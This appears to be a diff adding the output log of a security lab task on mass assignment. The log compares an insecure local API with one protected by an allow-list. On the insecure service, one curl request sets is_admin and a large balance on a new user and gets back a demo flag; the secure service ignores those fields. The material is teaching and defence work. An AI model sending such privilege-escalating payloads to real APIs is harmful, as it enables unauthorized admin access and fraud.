@@ -1,0 +1,14 @@
+=== TASK 2 — mass assignment :8080 (insecure) ===
+$ curl -s -X POST http://localhost:8080/api/users -H "Content-Type: application/json" -d {"username":"mallory","password":"x","is_admin":true,"balance":1000000}
+{"balance":1000000,"flag":"FLAG{massassign_demo}","id":6,"is_admin":true,"password":"x","username":"mallory"}
+
+[HTTP 201]
+
+=== TASK 2 — mass assignment :8081 (secure, allow-list) ===
+{"balance":0,"id":6,"is_admin":false,"password":"x","username":"mallory2"}
+
+[HTTP 201]
+--- secure: partial body (username only) -> expect 400
+{"error":"username and password required"}
+
+[HTTP 400]
